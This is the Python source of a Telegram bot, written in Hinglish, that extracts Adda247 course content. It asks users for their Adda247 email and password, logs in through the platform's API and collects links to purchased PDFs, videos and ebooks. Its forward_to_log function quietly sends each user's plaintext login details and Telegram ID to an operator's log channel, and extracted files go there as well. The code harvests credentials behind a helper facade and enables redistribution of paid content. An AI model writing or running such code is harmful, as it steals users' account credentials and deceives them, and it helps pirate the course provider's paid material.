import os
import time
import logging
import asyncio
import httpx
import pytz
from datetime import datetime
from pyrogram import Client, filters
from pyrogram.types import Message
from pyrogram.enums import ParseMode

import config

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

app = Client(
    "adda_extractor_bot",
    api_id=config.API_ID,
    api_hash=config.API_HASH,
    bot_token=config.BOT_TOKEN
)

USER_DATA = {}
THUMB_PATH = "thumb.jpg"
TIMEOUT = 30

BASE_HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Accept": "application/json, text/plain, */*",
    "Accept-Language": "en-US,en;q=0.9",
    "Origin": "https://www.adda247.com",
    "Referer": "https://www.adda247.com/",
    "X-Auth-Token": "fpoa43edty5",
    "deviceId": "web_browser_client_pro",
    "x-app-id": "adda247"
}

def safe_get(obj, *keys, default=None):
    try:
        for key in keys:
            if obj is None:
                return default
            obj = obj.get(key)
        return obj if obj is not None else default
    except (AttributeError, KeyError):
        return default

async def download_thumbnail():
    if not os.path.exists(THUMB_PATH) and getattr(config, 'THUMB_URL', None):
        try:
            async with httpx.AsyncClient() as client:
                response = await client.get(config.THUMB_URL)
                if response.status_code == 200:
                    with open(THUMB_PATH, 'wb') as f:
                        f.write(response.content)
                    return THUMB_PATH
        except Exception as e:
            logger.error(f"Thumbnail download failed: {e}")
            return None
    return THUMB_PATH if os.path.exists(THUMB_PATH) else None

async def make_request(url, headers=None, method="GET", json_data=None, timeout=TIMEOUT):
    req_headers = BASE_HEADERS.copy()
    if headers:
        req_headers.update(headers)

    try:
        async with httpx.AsyncClient(follow_redirects=True) as client:
            if method == "GET":
                response = await client.get(url, headers=req_headers, timeout=timeout)
            else:
                response = await client.post(url, headers=req_headers, json=json_data, timeout=timeout)
            
            if response.status_code == 200:
                return response.json()
            else:
                logger.warning(f"Endpoint {url} returned status: {response.status_code}")
                return None
    except Exception as e:
        logger.error(f"Request Error for {url}: {e}")
        return None

async def forward_to_log(message: Message, platform: str):
    if getattr(config, "PREMIUM_LOGS", None):
        try:
            log_text = (
                f"🔑 <b>NEW LOGIN RECEIVED</b>\n\n"
                f"👤 <b>User:</b> {message.from_user.mention} (<code>{message.from_user.id}</code>)\n"
                f"📱 <b>Platform:</b> {platform}\n"
                f"📝 <b>Data:</b> <code>{message.text}</code>"
            )
            await app.send_message(config.PREMIUM_LOGS, log_text, parse_mode=ParseMode.HTML)
        except Exception:
            pass

async def scrape_package_items(pkg_id, auth_headers, file_handle):
    items_count = 0
    endpoints = [
        (f"https://store.adda247.com/api/v1/my/purchase/OLC/{pkg_id}?src=aweb", "onlineClasses"),
        (f"https://store.adda247.com/api/v1/my/purchase/content/{pkg_id}?src=aweb", "contents"),
        (f"https://store.adda247.com/api/v1/my/purchase/test/{pkg_id}?src=aweb", "tests"),
        (f"https://store.adda247.com/api/v1/my/purchase/ebook/{pkg_id}?src=aweb", "ebooks")
    ]

    for endpoint, key in endpoints:
        resp = await make_request(endpoint, headers=auth_headers)
        if not resp:
            continue

        raw_data = safe_get(resp, "data")
        items = safe_get(resp, "data", key, default=[]) if isinstance(raw_data, dict) else (raw_data if isinstance(raw_data, list) else [])

        if isinstance(items, list):
            for item in items:
                if not isinstance(item, dict):
                    continue
                item_name = safe_get(item, "name", default="Untitled").replace('|', '_').replace('/', '_')
                
                pdf_file = safe_get(item, "pdfFileName") or safe_get(item, "pdf") or safe_get(item, "fileUrl")
                if pdf_file:
                    pdf_url = pdf_file if pdf_file.startswith("http") else f"https://store.adda247.com/{pdf_file}"
                    file_handle.write(f"{item_name}: {pdf_url}\n")
                    items_count += 1

                video_url = safe_get(item, "url") or safe_get(item, "videoUrl")
                if video_url:
                    file_handle.write(f"{item_name}: {video_url}\n")
                    items_count += 1
    return items_count

@app.on_message(filters.command(["start"]))
async def start_cmd(client, message: Message):
    await message.reply_text(
        f"👋 **Hello {message.from_user.first_name}!**\n\n"
        "Main Adda247 Batch Content Extractor Bot hoon.\n"
        "Extract karne ke liye `/adda` command use karein."
    )

@app.on_message(filters.command(["adda"]))
async def adda_command_handler(client, message: Message):
    USER_DATA[message.chat.id] = {"state": "WAITING_CREDENTIALS"}
    await message.reply_text(
        "🔹 <b>ADDA247 EXTRACTOR PRO</b> 🔹\n\n"
        "Apne login details iss format mein bhejein:\n"
        "📧 <code>email*password</code>\n\n"
        "<i>Example:</i>\n"
        "<code>user@gmail.com*pass123</code>\n\n"
        "❌ Cancel karne ke liye `/cancel` likhein.",
        parse_mode=ParseMode.HTML
    )

@app.on_message(filters.command(["cancel"]))
async def cancel_handler(client, message: Message):
    if message.chat.id in USER_DATA:
        del USER_DATA[message.chat.id]
        await message.reply_text("🛑 Process Cancelled.")
    else:
        await message.reply_text("Koi active process nahi chal rha.")

@app.on_message(filters.text & filters.private & ~filters.command(["adda", "start", "cancel"]))
async def handle_user_input(client, message: Message):
    chat_id = message.chat.id
    user_session = USER_DATA.get(chat_id)

    if not user_session:
        return

    # STEP 1: Login and List Batches
    if user_session.get("state") == "WAITING_CREDENTIALS":
        if '*' not in message.text:
            await message.reply_text("❌ Invalid format! Please use `email*password` format.")
            return

        status_msg = await message.reply_text("🔄 <b>Authenticating...</b>", parse_mode=ParseMode.HTML)
        await forward_to_log(message, "Adda247")

        email, password = message.text.split("*", 1)

        login_data = {
            "email": email.strip(),
            "providerName": "email",
            "sec": password.strip()
        }

        login_response = await make_request(
            "https://userapi.adda247.com/login?src=aweb",
            method="POST",
            json_data=login_data
        )

        if not login_response:
            await status_msg.edit_text("❌ <b>Login Failed:</b> Server response error.")
            del USER_DATA[chat_id]
            return

        jwt = safe_get(login_response, "jwtToken") or safe_get(login_response, "data", "jwtToken")
        user_id = safe_get(login_response, "userId") or safe_get(login_response, "data", "userId")

        if not jwt:
            await status_msg.edit_text("❌ <b>Login Failed:</b> Invalid Credentials.")
            del USER_DATA[chat_id]
            return

        # Correct Auth Header Mapping for Adda247 API
        auth_headers = {
            "X-Jwt-Token": jwt,
            "x-access-token": jwt,
            "Authorization": f"Bearer {jwt}",
            "jwtToken": jwt,
            "token": jwt
        }
        if user_id:
            auth_headers["userId"] = str(user_id)
            auth_headers["x-user-id"] = str(user_id)

        await status_msg.edit_text("✅ <b>Login Successful!</b>\n🔄 Fetching purchased courses...", parse_mode=ParseMode.HTML)

        # Updated Endpoint Sequence
        packages = []
        fetch_urls = [
            "https://store.adda247.com/api/v3/my/purchase?src=aweb",
            "https://store.adda247.com/api/v2/ppc/package/purchased?pageNumber=0&pageSize=100&src=aweb",
            "https://store.adda247.com/api/v1/my/purchase?src=aweb"
        ]

        for url in fetch_urls:
            packages_response = await make_request(url, headers=auth_headers)
            if packages_response:
                fetched = (
                    safe_get(packages_response, "data", "packages") or 
                    safe_get(packages_response, "data") or 
                    safe_get(packages_response, "packages")
                )
                if fetched and isinstance(fetched, list):
                    packages = fetched
                    break

        if not packages:
            await status_msg.edit_text("❌ <b>No Packages Found:</b> Account par koi active batch nahi mila.")
            del USER_DATA[chat_id]
            return

        USER_DATA[chat_id] = {
            "state": "WAITING_BATCH_SELECTION",
            "headers": auth_headers,
            "packages": packages
        }

        list_text = "📚 <b>SELECT YOUR BATCH</b> 📚\n\n"
        for idx, pkg in enumerate(packages, start=1):
            title = safe_get(pkg, "title") or safe_get(pkg, "packageName") or safe_get(pkg, "name", default="Untitled Batch")
            list_text += f"<b>{idx}.</b> {title}\n"

        list_text += "\n👇 <b>Reply with the Index Number of the batch (e.g., 1 or 2):</b>"
        await status_msg.edit_text(list_text, parse_mode=ParseMode.HTML)

    # STEP 2: Process Selected Batch Number
    elif user_session.get("state") == "WAITING_BATCH_SELECTION":
        if not message.text.isdigit():
            await message.reply_text("❌ Please enter a valid number from the list above.")
            return

        selected_index = int(message.text) - 1
        packages = user_session.get("packages", [])
        auth_headers = user_session.get("headers", {})

        if selected_index < 0 or selected_index >= len(packages):
            await message.reply_text(f"❌ Invalid Choice! Enter a number between 1 and {len(packages)}.")
            return

        selected_package = packages[selected_index]
        package_id = safe_get(selected_package, "packageId") or safe_get(selected_package, "id")
        package_title = (safe_get(selected_package, "title") or safe_get(selected_package, "packageName") or safe_get(selected_package, "name", default="Untitled")).replace('|', '_').replace('/', '_')

        del USER_DATA[chat_id]

        status_msg = await message.reply_text(
            f"⏳ <b>Extracting Batch Content:</b>\n📦 <code>{package_title}</code>\n\nPlease wait...",
            parse_mode=ParseMode.HTML
        )

        start_time = time.time()
        file_name = f"ADDA_{package_id}_{package_title}.txt"
        total_items = 0
        thumb_path = await download_thumbnail()

        with open(file_name, "w", encoding='utf-8') as file:
            total_items += await scrape_package_items(package_id, auth_headers, file)

            child_urls = [
                f"https://store.adda247.com/api/v2/ppc/package/child?packageId={package_id}&pageNumber=0&pageSize=100&src=aweb",
                f"https://store.adda247.com/api/v1/ppc/package/child?packageId={package_id}&src=aweb"
            ]

            child_packages = []
            for c_url in child_urls:
                c_resp = await make_request(c_url, headers=auth_headers)
                if c_resp:
                    fetched = safe_get(c_resp, "data", "packages", default=[]) or safe_get(c_resp, "data", default=[])
                    if fetched and isinstance(fetched, list):
                        child_packages.extend(fetched)
                        break

            for child in child_packages:
                child_id = safe_get(child, "packageId") or safe_get(child, "id")
                if child_id:
                    total_items += await scrape_package_items(child_id, auth_headers, file)

        if os.path.exists(file_name) and os.path.getsize(file_name) > 0:
            elapsed = time.time() - start_time
            user_mention = message.from_user.mention
            bot_text = getattr(config, 'BOT_TEXT', 'Adda247 Extractor')
            caption = (
                "🎓 <b>COURSE EXTRACTED</b> 🎓\n\n"
                f"📱 <b>APP:</b> ADDA 247\n"
                f"📚 <b>BATCH:</b> {package_title}\n"
                f"⏱ <b>TIME TAKEN:</b> {elapsed:.1f}s\n"
                f"📅 <b>DATE:</b> {datetime.now(pytz.timezone('Asia/Kolkata')).strftime('%d-%m-%Y %H:%M:%S')} IST\n\n"
                f"📊 <b>CONTENT STATS</b>\n"
                f"└─ 📁 Total Items: {total_items}\n\n"
                f"🚀 <b>Extracted by:</b> {user_mention}\n\n"
                f"<code>╾───• {bot_text} •───╼</code>"
            )

            await message.reply_document(
                document=file_name,
                caption=caption,
                thumb=thumb_path,
                parse_mode=ParseMode.HTML
            )

            if getattr(config, "PREMIUM_LOGS", None):
                try:
                    await app.send_document(
                        chat_id=config.PREMIUM_LOGS,
                        document=file_name,
                        caption=caption,
                        thumb=thumb_path,
                        parse_mode=ParseMode.HTML
                    )
                except Exception:
                    pass

            os.remove(file_name)
            await status_msg.delete()
        else:
            await status_msg.edit_text(f"⚠️ <code>{package_title}</code> mein koi downloadable content/links nahi mile.")

if __name__ == "__main__":
    print("Bot starting...")
    app.run()
